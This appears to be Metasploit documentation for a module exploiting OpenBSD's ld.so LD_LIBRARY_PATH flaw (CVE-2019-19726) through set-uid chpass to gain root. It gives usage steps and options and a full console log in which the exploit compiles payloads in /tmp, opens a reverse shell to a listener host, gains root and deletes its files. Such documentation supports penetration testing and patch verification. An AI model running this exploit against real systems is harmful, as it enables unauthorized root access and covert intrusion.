## Description

  This module exploits a vulnerability in the OpenBSD `ld.so`
  dynamic loader (CVE-2019-19726).

  The `_dl_getenv()` function fails to reset the `LD_LIBRARY_PATH`
  environment variable when set with approximately `ARG_MAX` colons.

  This can be abused to load `libutil.so` from an untrusted path,
  using `LD_LIBRARY_PATH` in combination with the `chpass` set-uid
  executable, resulting in privileged code execution.


## Vulnerable Application

  This module has been tested successfully on:

  * OpenBSD 6.1 (amd64)
  * OpenBSD 6.6 (amd64)


## Verification Steps

  1. Start `msfconsole`
  2. Get a session
  3. `use exploit/openbsd/local/dynamic_loader_chpass_privesc`
  4. `set SESSION <SESSION>`
  5. `check`
  6. `run`
  7. You should get a new *root* session


## Options

  **SESSION**

  Which session to use, which can be viewed with `sessions`

  **CHPASS_PATH**

  Path to chpass (default: `/usr/bin/chpass`)


## Scenarios

### OpenBSD 6.1 GENERIC#19 amd64

  ```
  msf5 > use exploit/openbsd/local/dynamic_loader_chpass_privesc 
  msf5 exploit(openbsd/local/dynamic_loader_chpass_privesc) > set verbose true
  verbose => true
  msf5 exploit(openbsd/local/dynamic_loader_chpass_privesc) > set session 1
  session => 1
  msf5 exploit(openbsd/local/dynamic_loader_chpass_privesc) > check

  [+] Patch 013_ldso is not present
  [+] cc is installed
  [*] The service is running, but could not be validated.
  msf5 exploit(openbsd/local/dynamic_loader_chpass_privesc) > set lhost 172.16.191.165
  lhost => 172.16.191.165
  msf5 exploit(openbsd/local/dynamic_loader_chpass_privesc) > run

  [*] Started reverse TCP double handler on 172.16.191.165:4444 
  [+] Patch 013_ldso is not present
  [+] cc is installed
  [+] Found libutil.so name: libutil.so.12.1
  [*] Writing '/tmp/.86MXG.c' (316 bytes) ...
  [*] Max line length is 4096
  [*] Writing 316 bytes in 1 chunks of 1145 bytes (octal-encoded), using printf
  [*] Compiling /tmp/libutil.so.12.1 ...
  [*] Writing '/tmp/.DRbqHJ.c' (602 bytes) ...
  [*] Max line length is 4096
  [*] Writing 602 bytes in 1 chunks of 2170 bytes (octal-encoded), using printf
  [*] Compiling /tmp/.DRbqHJ ...
  [*] Writing '/tmp/.2bowjnW1' (139 bytes) ...
  [*] Max line length is 4096
  [*] Writing 139 bytes in 1 chunks of 470 bytes (octal-encoded), using printf
  [*] Launching exploit...
  [*] Accepted the first client connection...
  [*] Accepted the second client connection...
  [*] Command: echo Y6H5kRiGDyQjzQKI;
  [*] Writing to socket A
  [*] Writing to socket B
  [*] Reading from sockets...
  [*] Reading from socket B
  [*] B: "Y6H5kRiGDyQjzQKI\r\n"
  [*] Matching...
  [*] A is input...
  [*] Command shell session 2 opened (172.16.191.165:4444 -> 172.16.191.205:43611) at 2019-12-13 04:03:22 -0500
  [+] Deleted /tmp/.86MXG.c
  [+] Deleted /tmp/libutil.so.12.1
  [+] Deleted /tmp/.DRbqHJ.c
  [+] Deleted /tmp/.DRbqHJ
  [+] Deleted /tmp/.2bowjnW1

  id
  uid=0(root) gid=0(wheel) groups=1001(test)
  uname -a
  OpenBSD openbsd-6-1.localdomain 6.1 GENERIC#19 amd64

  ```

